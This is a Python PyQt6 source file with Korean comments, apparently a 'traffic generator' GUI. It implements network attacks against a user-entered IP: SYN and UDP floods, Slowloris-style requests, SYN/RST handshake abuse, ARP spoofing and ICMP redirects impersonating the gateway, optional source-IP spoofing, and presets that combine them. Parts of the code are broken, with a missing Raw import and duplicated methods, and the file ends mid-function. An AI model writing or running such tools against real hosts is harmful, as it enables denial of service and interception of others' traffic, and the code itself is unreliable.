# 필요한 모듈을 임포트.
from PyQt6.QtWidgets import QWidget, QVBoxLayout, QLabel, QPushButton, QLineEdit, QHBoxLayout, QCheckBox, QMessageBox, QComboBox
from PyQt6.QtGui import QIcon
from scapy.all import IP, TCP, UDP, send, sr1, ICMP, Ether, ARP, conf
import threading
import socket
import random
from multiprocessing import Process, Value
import subprocess
import ctypes
import sys
import os
import json
from PyQt6.QtCore import Qt
import time
import struct

# 모듈 경로를 부모 디렉토리로 설정하기 위한 코드 추가
current_dir = os.path.dirname(os.path.abspath(__file__))
parent_dir = os.path.dirname(current_dir)  # components 디렉토리의 부모 (scripts)
sys.path.append(parent_dir)

# Scapy 설정 (Wireshark에서 캡처가 잘 되도록)
conf.verb = 0  # 상세 출력 비활성화

# SYN 플러드 공격을 수행하는 함수.
def syn_flood(target_ip, packet_count, packet_size, stop_flag, spoof_ip=None):
    # 현재 시스템의 기본 네트워크 인터페이스와 IP 주소 가져오기
    iface, src_ip = get_default_iface_and_ip()
    if not iface:
        print(f"네트워크 인터페이스를 찾을 수 없습니다.")
        return
    
    # IP 스푸핑이 활성화된 경우 소스 IP 변경
    if spoof_ip and is_valid_ip(spoof_ip):
        src_ip = spoof_ip
        print(f"IP 스푸핑 활성화: {spoof_ip}")

    print(f"SYN 플러드 시작 - 인터페이스: {iface}, 소스 IP: {src_ip}, 패킷 수: {packet_count}")
    
    # 패킷을 리스트에 모아서 한 번에 전송 (빠른 전송을 위함)
    packets = []
    for i in range(packet_count):
        if stop_flag.value:
            break
        
        sport = random.randint(1024, 65535)  # 소스 포트를 랜덤으로 생성
        dport = random.randint(1, 65535)     # 목적지 포트도 랜덤
        payload_size = max(0, packet_size - 20 - 20 - 14)  # IP(20) + TCP(20) + Ethernet(14)
        
        # 패킷 생성
        packet = IP(src=src_ip, dst=target_ip)/TCP(sport=sport, dport=dport, flags='S')/Raw(load='X'*payload_size)
        packets.append(packet)
        
        # 일정 개수마다 전송 (메모리 부담 감소)
        if len(packets) >= 1000 or i == packet_count-1:
            try:
                send(packets, iface=iface, verbose=0, inter=0, realtime=False)
                subprocess.run(f'echo {len(packets)}개 SYN 패킷 전송 ({i+1}/{packet_count})', shell=True)
                packets = []  # 패킷 리스트 초기화
            except Exception as e:
                subprocess.run(f'echo 패킷 전송 중 오류: {str(e)}', shell=True)

# UDP 플러드 공격을 수행하는 함수.
def udp_flood(target_ip, packet_count, packet_size, stop_flag, spoof_ip=None):
    # 현재 시스템의 기본 네트워크 인터페이스와 IP 주소 가져오기
    iface, src_ip = get_default_iface_and_ip()
    if not iface:
        print(f"네트워크 인터페이스를 찾을 수 없습니다.")
        return
    
    # IP 스푸핑이 활성화된 경우 소스 IP 변경
    if spoof_ip and is_valid_ip(spoof_ip):
        src_ip = spoof_ip
        print(f"IP 스푸핑 활성화: {spoof_ip}")

    print(f"UDP 플러드 시작 - 인터페이스: {iface}, 소스 IP: {src_ip}, 패킷 수: {packet_count}")
    
    # 패킷을 리스트에 모아서 한 번에 전송 (빠른 전송을 위함)
    packets = []
    for i in range(packet_count):
        if stop_flag.value:
            break
        
        sport = random.randint(1024, 65535)  # 소스 포트를 랜덤으로 생성
        dport = random.randint(1, 65535)     # 목적지 포트도 랜덤
        payload_size = max(0, packet_size - 20 - 8 - 14)  # IP(20) + UDP(8) + Ethernet(14)
        
        # 패킷 생성
        packet = IP(src=src_ip, dst=target_ip)/UDP(sport=sport, dport=dport)/Raw(load='X'*payload_size)
        packets.append(packet)
        
        # 일정 개수마다 전송 (메모리 부담 감소)
        if len(packets) >= 1000 or i == packet_count-1:
            try:
                send(packets, iface=iface, verbose=0, inter=0, realtime=False)
                subprocess.run(f'echo {len(packets)}개 UDP 패킷 전송 ({i+1}/{packet_count})', shell=True)
                packets = []  # 패킷 리스트 초기화
            except Exception as e:
                subprocess.run(f'echo 패킷 전송 중 오류: {str(e)}', shell=True)

# HTTP Slowloris 공격을 수행하는 함수
def http_slowloris(target_ip, packet_count, packet_size, stop_flag, spoof_ip=None):
    # 현재 시스템의 기본 네트워크 인터페이스와 IP 주소 가져오기
    iface, src_ip = get_default_iface_and_ip()
    if not iface:
        print(f"네트워크 인터페이스를 찾을 수 없습니다.")
        return

    # IP 스푸핑이 활성화된 경우 소스 IP 변경
    if spoof_ip and is_valid_ip(spoof_ip):
        src_ip = spoof_ip
        print(f"IP 스푸핑 활성화: {spoof_ip}")

    print(f"HTTP Slowloris 시작 - 인터페이스: {iface}, 소스 IP: {src_ip}, 패킷 수: {packet_count}")
    
    # HTTP 요청 헤더 생성
    http_headers = [
        "GET / HTTP/1.1",
        f"Host: {target_ip}",
        "User-Agent: Mozilla/5.0",
        "Accept: text/html",
        "Connection: keep-alive"
    ]
    
    # 패킷을 리스트에 모아서 한 번에 전송
    packets = []
    for i in range(packet_count):
        if stop_flag.value:
            break
        
        sport = random.randint(1024, 65535)  # 소스 포트를 랜덤으로 생성
        
        # 부분적인 HTTP 요청 생성 (완료되지 않는 요청)
        headers = http_headers.copy()
        # 패킷마다 다른 헤더 추가 (완료되지 않게)
        headers.append(f"X-Header-{i}: {'X' * min(50, i % 100)}")
        http_payload = "\r\n".join(headers)
        
        # 패킷 생성
        packet = IP(src=src_ip, dst=target_ip)/TCP(sport=sport, dport=80, flags='PA')/Raw(load=http_payload)
        packets.append(packet)
        
        # 일정 개수마다 전송 (메모리 부담 감소)
        if len(packets) >= 1000 or i == packet_count-1:
            try:
                send(packets, iface=iface, verbose=0, inter=0, realtime=False)
                subprocess.run(f'echo {len(packets)}개 HTTP Slowloris 패킷 전송 ({i+1}/{packet_count})', shell=True)
                packets = []  # 패킷 리스트 초기화
            except Exception as e:
                subprocess.run(f'echo 패킷 전송 중 오류: {str(e)}', shell=True)

# TCP 핸드셰이크 오용 공격을 수행하는 함수.
def tcp_handshake_misuse(target_ip, packet_count, packet_size, stop_flag, spoof_ip=None):
    # 현재 시스템의 기본 네트워크 인터페이스와 IP 주소 가져오기
    iface, src_ip = get_default_iface_and_ip()
    if not iface:
        print(f"네트워크 인터페이스를 찾을 수 없습니다.")
        return

    # IP 스푸핑이 활성화된 경우 소스 IP 변경
    if spoof_ip and is_valid_ip(spoof_ip):
        src_ip = spoof_ip
        print(f"IP 스푸핑 활성화: {spoof_ip}")

    print(f"TCP 핸드셰이크 오용 시작 - 인터페이스: {iface}, 소스 IP: {src_ip}, 패킷 수: {packet_count}")
    
    # 패킷을 리스트에 모아서 한 번에 전송
    syn_packets = []
    rst_packets = []
    
    for i in range(packet_count):
        if stop_flag.value:
            break
        
        sport = random.randint(1024, 65535)  # 소스 포트를 랜덤으로 생성
        dport = random.randint(1, 65535)     # 목적지 포트도 랜덤
        payload_size = max(0, packet_size - 20 - 20 - 14)  # IP(20) + TCP(20) + Ethernet(14)
        
        # SYN 패킷 생성
        syn_packet = IP(src=src_ip, dst=target_ip)/TCP(sport=sport, dport=dport, flags='S')/Raw(load='X'*payload_size)
        syn_packets.append(syn_packet)
        
        # RST 패킷 생성 (핸드셰이크 중단)
        rst_packet = IP(src=src_ip, dst=target_ip)/TCP(sport=sport, dport=dport, flags='R')
        rst_packets.append(rst_packet)
        
        # 일정 개수마다 전송 (메모리 부담 감소)
        if len(syn_packets) >= 1000 or i == packet_count-1:
            try:
                # SYN 패킷 전송
                send(syn_packets, iface=iface, verbose=0, inter=0, realtime=False)
                subprocess.run(f'echo {len(syn_packets)}개 TCP SYN 패킷 전송 ({i+1}/{packet_count})', shell=True)
                
                # 약간의 지연 후 RST 패킷 전송
                time.sleep(0.01)
                send(rst_packets, iface=iface, verbose=0, inter=0, realtime=False)
                subprocess.run(f'echo {len(rst_packets)}개 TCP RST 패킷 전송 ({i+1}/{packet_count})', shell=True)
                
                # 패킷 리스트 초기화
                syn_packets = []
                rst_packets = []
            except Exception as e:
                subprocess.run(f'echo 패킷 전송 중 오류: {str(e)}', shell=True)

# SSL/TLS 트래픽을 생성하는 함수.
def ssl_traffic(target_ip, count, packet_size, stop_flag):
    import ssl
    import socket
    for _ in range(count):
        if stop_flag.value:
            break
        context = ssl.create_default_context()
        with socket.create_connection((target_ip, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=target_ip) as ssock:
                data_size = packet_size - 20 - 20 - 14  # IP header (20 bytes) + TCP header (20 bytes) + Ethernet header (14 bytes)
                data = b'GET / HTTP/1.1\r\nHost: ' + target_ip.encode() + b'\r\n' + b'X' * data_size + b'\r\n\r\n'
                ssock.sendall(data)
                subprocess.run(f'echo SSL/TLS packet sent to {target_ip}:443', shell=True)

# HTTP 요청을 변조하는 함수.
def http_request_modification(target_ip, packet_count, packet_size, stop_flag):
    import requests
    for _ in range(packet_count):
        if stop_flag.value:
            break
        headers = {'User-Agent': 'ModifiedUserAgent'}
        try:
            requests.get(f'http://{target_ip}', headers=headers)
            subprocess.run(f'echo HTTP request sent to {target_ip}', shell=True)
        except requests.exceptions.RequestException:
            pass

# ARP 스푸핑 공격을 수행하는 함수.
def arp_spoof(target_ip, spoof_ip, stop_flag):
    # 현재 시스템의 기본 네트워크 인터페이스와 IP 주소 가져오기
    iface, src_ip = get_default_iface_and_ip()
    if not iface:
        print(f"네트워크 인터페이스를 찾을 수 없습니다.")
        return

    print(f"ARP 스푸핑 시작 - 인터페이스: {iface}, 소스 IP: {src_ip}, 스푸핑 IP: {spoof_ip}")
    
    # 타겟의 MAC 주소 획득 시도
    target_mac = None
    try:
        # ARP 요청을 보내 MAC 주소 확인 시도
        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_ip)
        response = sr1(arp_request, timeout=1, verbose=0, iface=iface)
        if response:
            target_mac = response.hwsrc
        else:
            target_mac = "ff:ff:ff:ff:ff:ff"  # 찾지 못한 경우 브로드캐스트 MAC 사용
    except Exception as e:
        print(f"타겟 MAC 주소 확인 중 오류: {str(e)}")
        target_mac = "ff:ff:ff:ff:ff:ff"  # 오류 발생 시 브로드캐스트 MAC 사용
    
    # ARP 스푸핑 패킷 생성 (여러 개를 미리 생성)
    arp_packets = []
    for i in range(100):  # 100개의 패킷을 미리 생성
        arp_response = ARP(op="is-at", 
                          psrc=spoof_ip,  # 스푸핑할 IP (대개 게이트웨이)
                          pdst=target_ip,  # 타겟 IP
                          hwdst=target_mac,  # 타겟 MAC
                          hwsrc=Ether().src)  # 자신의 MAC
        arp_packets.append(arp_response)
    
    # 패킷 카운터
    count = 0
    
    # 연속 스푸핑 시작
    while not stop_flag.value:
        try:
            # 미리 생성한 패킷들을 빠르게 전송
            send(arp_packets, iface=iface, verbose=0, inter=0)
            count += len(arp_packets)
            subprocess.run(f'echo ARP 스푸핑 패킷 {count}개 전송됨', shell=True)
            
            # 약간의 지연 (ARP 캐시 갱신 주기보다 짧게)
            time.sleep(0.5)
        except Exception as e:
            subprocess.run(f'echo ARP 패킷 전송 중 오류: {str(e)}', shell=True)
            time.sleep(1.0)  # 오류 발생 시 좀 더 긴 지연

# ICMP 리다이렉트 공격을 수행하는 함수.
def icmp_redirect(target_ip, new_gateway_ip, stop_flag):
    # 현재 시스템의 기본 네트워크 인터페이스와 IP 주소 가져오기
    iface, src_ip = get_default_iface_and_ip()
    if not iface:
        print(f"네트워크 인터페이스를 찾을 수 없습니다.")
        return

    print(f"사용 인터페이스: {iface}, 소스 IP: {src_ip}")
    
    # 원래 게이트웨이 IP 확인 (실제 게이트웨이 주소를 사용하도록)
    gateway_ip = get_default_gateway() or "192.168.1.1"
    
    count = 0
    while not stop_flag.value:
        count += 1
        try:
            # Scapy를 사용하여 ICMP 리다이렉트 패킷 생성
            redirect_packet = IP(src=gateway_ip, dst=target_ip)/ICMP(
                type=5,  # 리다이렉트
                code=1,  # 호스트에 대한 리다이렉트
                gw=new_gateway_ip)/IP(src=target_ip, dst="8.8.8.8")
            
            # 패킷 전송
            send(redirect_packet, iface=iface, verbose=0)
            subprocess.run(f'echo ICMP redirect packet #{count} sent to {target_ip} via Scapy (new gateway: {new_gateway_ip})', shell=True)
            
            # 리다이렉트도 주기적으로 반복
            time.sleep(1.0)
            
        except Exception as e:
            subprocess.run(f'echo Error sending ICMP redirect packet: {str(e)}', shell=True)
            time.sleep(1.0)  # 오류 발생 시 더 긴 지연

# 네트워크 인터페이스와 IP 가져오는 유틸리티 함수
def get_default_iface_and_ip():
    try:
        # Windows에서 기본 네트워크 인터페이스 찾기
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            # Google DNS에 연결하여 사용 중인 인터페이스/IP 확인
            s.connect(("8.8.8.8", 80))
            src_ip = s.getsockname()[0]
            s.close()
            
            # Scapy의 conf.iface 사용
            iface = conf.iface
            print(f"Scapy 기본 인터페이스: {iface}, IP: {src_ip}")
            return iface, src_ip
            
        except socket.error:
            print("네트워크 연결을 확인할 수 없습니다.")
            s.close()
    except Exception as e:
        print(f"인터페이스 확인 중 오류: {str(e)}")
    
    # 실패 시 localhost로 폴백
    return conf.loopback_name, "127.0.0.1"

# 기본 게이트웨이 주소를 확인하는 함수
def get_default_gateway():
    try:
        # Scapy에서 기본 라우트 정보 가져오기
        for net, msk, gw, iface, addr, metric in conf.route.routes:
            if net == 0 and msk == 0:  # 기본 라우트
                return gw
    except:
        pass
    
    # 실패 시 None 반환
    return None

# IP 주소의 유효성을 검사하는 함수
def is_valid_ip(ip):
    # IP 주소 유효성 검사
    try:
        socket.inet_pton(socket.AF_INET, ip)
        return True
    except socket.error:
        return False

def test_packet_send(target_ip="127.0.0.1", method="scapy"):
    """패킷 전송 테스트 함수"""
    print(f"패킷 전송 테스트 시작 ({method} 사용)")
    
    try:
        if method == "socket":
            # 일반 소켓 사용
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(b"TEST", (target_ip, 12345))
            s.close()
            print("소켓 테스트 완료")
            return True
            
        elif method == "scapy":
            # Scapy 사용
            iface = conf.iface  # Scapy 기본 인터페이스 사용
            print(f"Scapy 사용 인터페이스: {iface}")
            packet = IP(dst=target_ip)/UDP(dport=12345)/b"TEST"
            send(packet, iface=iface, verbose=1)  # verbose=1로 설정하여 전송 정보 표시
            print("Scapy 테스트 완료")
            return True
    except Exception as e:
        print(f"패킷 전송 테스트 오류: {str(e)}")
        return False

def standalone_syn_flood(target_ip, packet_count, packet_size, stop_flag, spoof_ip=None):
    syn_flood(target_ip, packet_count, packet_size, stop_flag, spoof_ip)


def standalone_udp_flood(target_ip, packet_count, packet_size, stop_flag, spoof_ip=None):
    udp_flood(target_ip, packet_count, packet_size, stop_flag, spoof_ip)


def standalone_http_slowloris(target_ip, packet_count, packet_size, stop_flag, spoof_ip=None):
    http_slowloris(target_ip, packet_count, packet_size, stop_flag, spoof_ip)


def standalone_tcp_handshake_misuse(target_ip, packet_count, packet_size, stop_flag, spoof_ip=None):
    tcp_handshake_misuse(target_ip, packet_count, packet_size, stop_flag, spoof_ip)


def standalone_ssl_traffic(target_ip, packet_count, packet_size, stop_flag):
    ssl_traffic(target_ip, packet_count, packet_size, stop_flag)


def standalone_http_request_modification(target_ip, packet_count, packet_size, stop_flag):
    http_request_modification(target_ip, packet_count, packet_size, stop_flag)


def standalone_arp_spoof(target_ip, spoof_ip, stop_flag):
    arp_spoof(target_ip, spoof_ip, stop_flag)


def standalone_icmp_redirect(target_ip, new_gateway_ip, stop_flag):
    icmp_redirect(target_ip, new_gateway_ip, stop_flag)

# 트래픽 생성기 애플리케이션 클래스.
class TrafficGeneratorApp(QWidget):
    def __init__(self, main_app, parent=None):
        super().__init__(parent)
        self.main_app = main_app  # MainApp 인스턴스를 저장
        self.setWindowTitle("트래픽 생성기")
        layout = QVBoxLayout()

        # 상단 레이아웃 설정
        top_layout = QHBoxLayout()

        # 뒤로가기 버튼을 설정.
        back_button = QPushButton("")
        back_button.setIcon(QIcon.fromTheme("go-previous"))  # 아이콘 설정
        back_button.setFixedSize(30, 30)  # 다른 어플리케이션과 동일한 크기
        back_button.clicked.connect(self.go_back)  # 뒤로가기 기능 연결
        top_layout.addWidget(back_button)

        # IP 입력 필드를 설정.
        ip_label = QLabel("대상 IP:")
        self.ip_input = QLineEdit()
        # 기본값으로 localhost 설정 (테스트 용도)
        self.ip_input.setText("127.0.0.1")
        top_layout.addWidget(ip_label)
        top_layout.addWidget(self.ip_input)

        layout.addLayout(top_layout)

        # IP 스푸핑 설정 추가
        spoof_layout = QHBoxLayout()
        self.spoof_ip_checkbox = QCheckBox("IP 스푸핑 사용")
        self.spoof_ip_input = QLineEdit()
        self.spoof_ip_input.setPlaceholderText("스푸핑할 소스 IP 주소 입력")
        self.spoof_ip_input.setEnabled(False)
        self.spoof_ip_checkbox.stateChanged.connect(self.toggle_spoof_ip)
        spoof_layout.addWidget(self.spoof_ip_checkbox)
        spoof_layout.addWidget(self.spoof_ip_input)
        layout.addLayout(spoof_layout)
        
        # 패킷 전송 테스트 버튼 추가
        test_layout = QHBoxLayout()
        test_button = QPushButton("패킷 전송 테스트")
        test_button.clicked.connect(self.test_packet_transmission)
        test_layout.addWidget(test_button)
        layout.addLayout(test_layout)

        # 기본 프리셋 추가
        self.presets = {
            "SYN 플러드 + ARP 스푸핑": {
                "syn_flood": True,
                "arp_spoofing": True
            },
            "SYN 플러드 + ICMP 리다이렉트": {
                "syn_flood": True,
                "icmp_redirect": True
            },
            "UDP 플러드 + ARP 스푸핑": {
                "udp_flood": True,
                "arp_spoofing": True
            },
            "HTTP Slowloris + ARP 스푸핑": {
                "http_slowloris": True,
                "arp_spoofing": True
            },
            "TCP 핸드셰이크 오용 + ARP 스푸핑": {
                "tcp_handshake_misuse": True,
                "arp_spoofing": True
            },
            "SSL/TLS 트래픽 생성 + 포트 미러링": {
                "ssl_traffic": True,
                "port_mirroring": True
            },
            "HTTP 요청 변조 + ARP 스푸핑": {
                "http_request_modification": True,
                "arp_spoofing": True
            }
        }

        # 패킷 크기 선택 체크박스 추가
        packet_size_layout = QHBoxLayout()
        self.default_packet_size_checkbox = QCheckBox("기본 패킷 크기 (1514 바이트)")
        self.large_packet_size_checkbox = QCheckBox("큰 패킷 크기 (단편화 증가)")
        self.default_packet_size_checkbox.setChecked(True)  # 기본 선택
        packet_size_layout.addWidget(self.default_packet_size_checkbox)
        packet_size_layout.addWidget(self.large_packet_size_checkbox)
        layout.addLayout(packet_size_layout)

        # 체크박스 상호 배타적 설정
        self.default_packet_size_checkbox.stateChanged.connect(lambda: self.toggle_packet_size())
        self.large_packet_size_checkbox.stateChanged.connect(lambda: self.toggle_packet_size())

        # 프리셋 선택 드롭다운 추가
        preset_layout = QHBoxLayout()
        self.preset_dropdown = QComboBox()
        self.preset_dropdown.addItems(self.presets.keys())
        self.preset_dropdown.currentIndexChanged.connect(self.apply_preset)
        preset_layout.addWidget(QLabel("기본 프리셋:"))
        preset_layout.addWidget(self.preset_dropdown)
        layout.addLayout(preset_layout)

        # 1번 선택군과 2번 선택군을 나란히 배치
        attack_group_layout = QHBoxLayout()

        # 1번 선택군 체크박스 설정 (트래픽 생성 관련 공격)
        group1_layout = QVBoxLayout()
        group1_label = QLabel("1번 선택군 (트래픽 생성):")
        group1_layout.addWidget(group1_label)
        self.syn_flood_checkbox = QCheckBox("SYN 플러드")
        self.udp_flood_checkbox = QCheckBox("UDP 플러드")
        self.http_slowloris_checkbox = QCheckBox("HTTP Slowloris")
        self.tcp_handshake_misuse_checkbox = QCheckBox("TCP 핸드셰이크 오용")
        self.ssl_traffic_checkbox = QCheckBox("SSL/TLS 트래픽")
        self.http_request_modification_checkbox = QCheckBox("HTTP 요청 변조")
        group1_layout.addWidget(self.syn_flood_checkbox)
        group1_layout.addWidget(self.udp_flood_checkbox)
        group1_layout.addWidget(self.http_slowloris_checkbox)
        group1_layout.addWidget(self.tcp_handshake_misuse_checkbox)
        group1_layout.addWidget(self.ssl_traffic_checkbox)
        group1_layout.addWidget(self.http_request_modification_checkbox)

        # 2번 선택군 체크박스 설정 (네트워크 조작 관련 공격)
        group2_layout = QVBoxLayout()
        group2_label = QLabel("2번 선택군 (네트워크 조작):")
        group2_layout.addWidget(group2_label)
        self.arp_spoofing_checkbox = QCheckBox("ARP 스푸핑")
        self.icmp_redirect_checkbox = QCheckBox("ICMP 리다이렉트")
        self.port_mirroring_checkbox = QCheckBox("포트 미러링")
        group2_layout.addWidget(self.arp_spoofing_checkbox)
        group2_layout.addWidget(self.icmp_redirect_checkbox)
        group2_layout.addWidget(self.port_mirroring_checkbox)

        # 각 그룹의 요소들을 정렬하여 깔끔하게 배치
        group1_layout.setAlignment(Qt.AlignmentFlag.AlignTop)
        group2_layout.setAlignment(Qt.AlignmentFlag.AlignTop)

        attack_group_layout.addLayout(group1_layout)
        attack_group_layout.addLayout(group2_layout)
        layout.addLayout(attack_group_layout)

        # 패킷 수 입력 필드를 설정.
        packet_count_layout = QHBoxLayout()
        packet_count_label = QLabel("패킷 수:")
        self.packet_count_input = QLineEdit("10")
        packet_count_layout.addWidget(packet_count_label)
        packet_count_layout.addWidget(self.packet_count_input)
        layout.addLayout(packet_count_layout)

        # 패킷 생성 버튼을 설정.
        generate_button = QPushButton("패킷 생성 및 전송")
        generate_button.clicked.connect(self.generate_traffic)
        layout.addWidget(generate_button)

        # 전송 중단 버튼을 설정.
        stop_button = QPushButton("전송 중단")
        stop_button.clicked.connect(self.stop_transmission)
        layout.addWidget(stop_button)

        self.setLayout(layout)

        # 스레드 및 프로세스 추적을 위한 리스트를 초기화.
        self.processes = []
        self.stop_flag = Value('b', False)

    # 메인 화면으로 돌아가는 메서드.
    def go_back(self):
        # MainApp의 show_main_screen 메서드를 호출
        self.main_app.show_main_screen()

    def run_syn_flood(self, target_ip, packet_count):
        syn_flood(target_ip, packet_count, self.get_packet_size(), self.stop_flag)

    def run_udp_flood(self, target_ip, packet_count):
        udp_flood(target_ip, packet_count, self.get_packet_size(), self.stop_flag)

    def run_http_slowloris(self, target_ip, packet_count):
        http_slowloris(target_ip, packet_count, self.get_packet_size(), self.stop_flag)

    def run_tcp_handshake_misuse(self, target_ip, packet_count):
        tcp_handshake_misuse(target_ip, packet_count, self.get_packet_size(), self.stop_flag)

    def run_ssl_traffic(self, target_ip, packet_count):
        ssl_traffic(target_ip, packet_count, self.get_packet_size(), self.stop_flag)

    def run_http_request_modification(self, target_ip, packet_count):
        http_request_modification(target_ip, packet_count, self.get_packet_size(), self.stop_flag)

    def run_arp_spoof(self, target_ip, spoof_ip):
        arp_spoof(target_ip, spoof_ip, self.stop_flag)

    def run_icmp_redirect(self, target_ip, new_gateway_ip):
        icmp_redirect(target_ip, new_gateway_ip, self.stop_flag)

    # 트래픽을 생성하고 전송하는 메서드.
    def generate_traffic(self):
        if not self.is_admin():
            QMessageBox.critical(self, "권한 오류", "관리자 권한이 필요합니다.")
            self.request_admin_privileges()
            return

        self.stop_flag.value = False  # 중단 플래그 초기화
        target_ip = self.ip_input.text().strip()
        packet_count = int(self.packet_count_input.text())
        packet_size = self.get_packet_size()  # 패킷 크기 가져오기
        
        # IP 스푸핑 설정 확인
        spoof_ip = None
        if self.spoof_ip_checkbox.isChecked():
            spoof_ip = self.spoof_ip_input.text().strip()
            if not is_valid_ip(spoof_ip):
                QMessageBox.warning(self, "잘못된 스푸핑 IP", "올바른 스푸핑 IP 주소를 입력하세요.")
                return
        
        if self.is_valid_ip(target_ip):
            if spoof_ip:
                QMessageBox.information(self, "트래픽 생성", f"트래픽 생성이 시작됩니다. 소스 IP가 {spoof_ip}로 변조됩니다.")
            else:
                QMessageBox.information(self, "트래픽 생성", "트래픽 생성이 시작됩니다.")
            
            self.cmd_process = subprocess.Popen("start cmd /k echo 트래픽 생성 중...", shell=True)

            attack_methods = []
            if self.syn_flood_checkbox.isChecked():
                attack_methods.append((standalone_syn_flood, (target_ip, packet_count, packet_size, self.stop_flag, spoof_ip)))
            if self.udp_flood_checkbox.isChecked():
                attack_methods.append((standalone_udp_flood, (target_ip, packet_count, packet_size, self.stop_flag, spoof_ip)))
            if self.http_slowloris_checkbox.isChecked():
                attack_methods.append((standalone_http_slowloris, (target_ip, packet_count, packet_size, self.stop_flag, spoof_ip)))
            if self.tcp_handshake_misuse_checkbox.isChecked():
                attack_methods.append((standalone_tcp_handshake_misuse, (target_ip, packet_count, packet_size, self.stop_flag, spoof_ip)))
            if self.ssl_traffic_checkbox.isChecked():
                attack_methods.append((standalone_ssl_traffic, (target_ip, packet_count, packet_size, self.stop_flag)))
            if self.http_request_modification_checkbox.isChecked():
                attack_methods.append((standalone_http_request_modification, (target_ip, packet_count, packet_size, self.stop_flag)))
            if self.arp_spoofing_checkbox.isChecked():
                # 스푸핑할 IP로는 spoof_ip를 사용하거나, 없는 경우 기본값 사용
                spoof_gateway_ip = spoof_ip if spoof_ip else "192.168.1.1"
                attack_methods.append((standalone_arp_spoof, (target_ip, spoof_gateway_ip, self.stop_flag)))
            if self.icmp_redirect_checkbox.isChecked():
                # ICMP 리다이렉트를 위한 추가 입력 필요
                new_gateway_ip = "192.168.1.254"  # 예시 IP, 실제로는 사용자 입력 필요
                attack_methods.append((standalone_icmp_redirect, (target_ip, new_gateway_ip, self.stop_flag)))

            for method, args in attack_methods:
                process = Process(target=method, args=args)
                process.start()
                self.processes.append(process)
            
            if spoof_ip:
                print(f"패킷이 {target_ip}로 전송되었습니다. (소스 IP: {spoof_ip} - 변조됨)")
            else:
                print(f"패킷이 {target_ip}로 전송되었습니다.")
        else:
            QMessageBox.warning(self, "잘못된 IP", "올바른 IP 주소를 입력하세요.")
            self.ip_input.clear()

    # IP 주소의 유효성을 검사하는 메서드.
    def is_valid_ip(self, ip):
        # IP 주소 유효성 검사
        try:
            socket.inet_pton(socket.AF_INET, ip)
            return True
        except socket.error:
            return False

    # HTTP Slowloris 공격을 구현하는 메서드.
    def slowloris_attack(self, target_ip):
        # HTTP Slowloris 공격 구현
        pass

    # 트래픽 전송을 중단하는 메서드.
    def stop_transmission(self):
        self.stop_flag.value = True  # 중단 플래그 설정
        for process in self.processes:
            process.terminate()  # 프로세스 종료
        self.processes.clear()
        print("전송이 중단되었습니다.")
        if hasattr(self, 'cmd_process'):
            self.cmd_process.terminate()  # 명령 프롬프트 창 닫기
        # 트래픽 생성 중단 알림
        QMessageBox.information(self, "트래픽 중단", "트래픽 생성이 중단되었습니다.")

    def is_admin(self):
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def request_admin_privileges(self):
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        except Exception as e:
            QMessageBox.critical(self, "권한 오류", f"관리자 권한 요청에 실패했습니다: {e}")

    def apply_preset(self):
        preset_name = self.preset_dropdown.currentText()
        preset = self.presets.get(preset_name, {})

        self.syn_flood_checkbox.setChecked(preset.get("syn_flood", False))
        self.udp_flood_checkbox.setChecked(preset.get("udp_flood", False))
        self.http_slowloris_checkbox.setChecked(preset.get("http_slowloris", False))
        self.tcp_handshake_misuse_checkbox.setChecked(preset.get("tcp_handshake_misuse", False))
        self.ssl_traffic_checkbox.setChecked(preset.get("ssl_traffic", False))
        self.http_request_modification_checkbox.setChecked(preset.get("http_request_modification", False))
        self.arp_spoofing_checkbox.setChecked(preset.get("arp_spoofing", False))
        self.icmp_redirect_checkbox.setChecked(preset.get("icmp_redirect", False))
        self.port_mirroring_checkbox.setChecked(preset.get("port_mirroring", False))

    def toggle_packet_size(self):
        sender = self.sender()
        if sender == self.default_packet_size_checkbox and self.default_packet_size_checkbox.isChecked():
            self.large_packet_size_checkbox.setChecked(False)
        elif sender == self.large_packet_size_checkbox and self.large_packet_size_checkbox.isChecked():
            self.default_packet_size_checkbox.setChecked(False)

    def get_packet_size(self):
        if self.default_packet_size_checkbox.isChecked():
            return 1514
        elif self.large_packet_size_checkbox.isChecked():
            return 9000  # 예시로 큰 패킷 크기 설정
        return 1514  # 기본값 

    def toggle_spoof_ip(self):
        """IP 스푸핑 체크박스 상태에 따라 IP 입력 필드 활성화/비활성화"""
        self.spoof_ip_input.setEnabled(self.spoof_ip_checkbox.isChecked())
        if not self.spoof_ip_checkbox.isChecked():
            self.spoof_ip_input.clear()

    def test_packet_transmission(self):
        """패킷 전송 테스트 함수"""
        target_ip = self.ip_input.text().strip()
        if not self.is_valid_ip(target_ip):
            QMessageBox.warning(self, "잘못된 IP", "올바른 IP 주소를 입력하세요.")
            return
            
        # 세 가지 방법으로 테스트
        socket_test = test_packet_send(target_ip, "socket")
        raw_test = test_packet_send(target_ip, "raw")
        scapy_test = test_packet_send(target_ip, "scapy")
        
        result = "패킷 전송 테스트 결과:\n"
        result += f"일반 소켓: {'성공' if socket_test else '실패'}\n"
        result += f"Raw 소켓: {'성공' if raw_test else '실패'}\n"
        result += f"Scapy: {'성공' if scapy_test else '실패'}\n"
        
        if socket_test or raw_test or scapy_test:
            result += "\n최소한 하나의 방법이 작동합니다. 패킷 전송이 가능합니다."
            QMessageBox.information(self, "테스트 결과", result)
        else:
            result += "\n모든 방법이 실패했습니다. 관리자 권한 확인이 필요합니다."
            QMessageBox.critical(self, "테스트 실패", result)
    
    def toggle_spoof_ip(self):
        """IP 스푸핑 체크박스 상태에 따라 IP 입력 필드 활성화/비활성화"""
        self.spoof_ip_input.setEnabled(self.spoof_ip_checkbox.isChecked())
        if not self.spoof_ip_checkbox.isChecked():
            self.spoof_ip_input.clear()

    # 트래픽을 생성하고 전송하는 메서드.
    def generate_traffic(self):
        if not self.is_admin():
            QMessageBox.critical(self, "권한 오류", "관리자 권한이 필요합니다.")
            self.request_admin_privileges()
            return

        self.stop_flag.value = False  # 중단 플래그 초기화
        target_ip = self.ip_input.text().strip()
        packet_count = int(self.packet_count_input.text())
        packet_size = self.get_packet_size()  # 패킷 크기 가져오기
        
